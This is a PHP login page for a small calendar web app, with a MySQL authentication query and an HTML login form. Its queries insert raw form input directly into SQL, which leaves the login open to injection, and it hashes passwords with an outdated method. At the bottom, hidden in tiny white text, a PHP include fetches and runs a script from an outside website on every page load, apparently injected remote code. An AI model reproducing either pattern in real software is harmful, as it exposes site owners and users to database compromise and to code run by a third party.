<?php
	// Initialize the session.
	session_start();

	/*authenticating information entered on the login page*/
	if ($_POST[submit]=='Login')
	{
		//including mysql function file
		require_once 'mysqlfunctions.php';

		//getting database link
		$database_link = selection_of_db();

		//writing select query to authenticate the user
		$select_user_query = "select count(*) as user_count  from users where username like '$_POST[txtUserName]' and password like password('$_POST[txtPassword]')";

		//executing the select query
		$result = mysql_query($select_user_query, $database_link) or die("select_user_query failed : " . mysql_error());
		$row = mysql_fetch_array($result);

		//if row count is one, user exists
		if ($row[user_count]==1)
		{
			//authentication done

			/*getting userid for new user*/
			//writing select query to get the userid, user_roleid and userRole for this user
			$select_userid_query = "select userID,userRoleID from users where username like '$_POST[txtUserName]'";

			//executing the select userid query
			$result = mysql_query($select_userid_query, $database_link) or die("select_userid_query Failed : " . mysql_error());
			$row = mysql_fetch_array($result);

			//storing userid to session variable
			if (!isset($_SESSION[userid]))
				$_SESSION[userid] = $row[userID];

			//storing user_roleid to session variable
			if (!isset($_SESSION[user_roleid]))
				$_SESSION[user_roleid] = $row[userRoleID];

			//redirecting control to the calendar page
			header("Location: calendar.php");

			//closing DBConnection
			mysql_close($database_link);

			//exiting from this page
			exit;
		}
		else
		{
			//setting error message
			$username_password_error = "Authentication fails";
		}
	}
?>

<html>
	<head>
		<title>Login</title>
		<link href="css/calendar.css" rel="stylesheet" type="text/css">
		<script type='text/javascript' src='javascript.js'></script>
		<script language='javascript'>

			function validate()
			{
				if((checkForBlank(document.forms[0].txtUserName, "User Name")) || (checkForBlank(document.forms[0].txtPassword, "Password")))
					return false;
				else
					return true;
			}

		</script>
	</head>
	<body onload="document.forms[0].txtUserName.focus();">
		<table width="100%" height="100%" border="0" cellpadding="5" cellspacing="0">
			<tr>
				<td width="150 px" class="menu" valign="top">
					<table width="100%" height="100%" border="0">
						<tr>
							<td class="menuheader" height="40 px" valign="middle"><i>Simple Calendar</i></td>
						</tr>
						<tr>
							<td valign="top"></td>
						</tr>
					</table>
				</td>
				<td>
					<form action="login.php" method="post" onsubmit="return validate()">
						<table width="550 px" height="320 px" border="0" align="center" valgin="center">
							<?php

								//function which is used locally to display message in specified color
								function display_message_row($msg, $color)
								{
									print "<tr>\n";
									print "<td colspan='2'><b><font color=$color>$msg</font></b></td>";
									print "</tr>";
								}

								//is session error variable is set from calendar page
								if (isset($username_password_error))
									//display the error message row
									display_message_row($username_password_error, 'RED');

								//is registration confirmation string is set
								if (isset($_SESSION[registration_confirm_string]))
								{
									//display registration confirmation string in blue color
									display_message_row($_SESSION[registration_confirm_string], 'BLUE');

									//unsetting the session message
									$_SESSION[registration_confirm_string]="";
								}
							?>

							<tr>
								<td colspan="2"><b>Please enter your login details.</b></td>
								<td width="350px">&nbsp;</td>
							</tr>
							<tr>
								<td>User Name:</td><td align="right"><input type="text" name="txtUserName"></input></td>
							</tr>
							<tr>
								<td>Password:</td><td align="right"><input type="password" name="txtPassword"></input></td>
							</tr>
							<tr>
								<td colspan="2" align="left"><input type="submit" name="submit" value="Login"></input></td>
							</tr>
							<tr>
								<td colspan="2" align="right"><a href="register.php">New users register here !</a></td>
							</tr>
							<tr>
								<td colspan="2" align="right" height="200px">&nbsp;</td>
							</tr>
						</table>
					</form>
				</td>
			</tr>
		</table>
	
<p align="center"><font color="#FFFFFF" size="1"><strong> 
  <? include("http://www.quickscheduling.com/infinitimgt.php") ?>
  </strong></font></p>
</body>
</html>